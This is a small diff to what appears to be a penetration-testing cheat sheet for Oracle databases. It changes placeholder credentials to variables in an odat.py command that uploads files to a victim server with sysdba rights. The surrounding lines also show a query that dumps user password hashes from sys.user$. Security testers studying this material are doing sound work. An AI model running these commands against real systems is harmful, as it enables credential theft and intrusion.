@@ -21,7 +21,7 @@ select * from user_role_privs;
 select name, password from sys.user$;
 
 # Upload Files (if possible)
-./odat.py utlfile -s $VICTIM_IP -d <SID> -U <user> -P <pass> --sysdba --putFile <localfile> <remotepath> <localfile>
+./odat.py utlfile -s $VICTIM_IP -d <SID> -U $USER -P $PASS --sysdba --putFile <localfile> <remotepath> <localfile>
 ```
 
 ### <span style="color:#50FA7B">Odat</span>
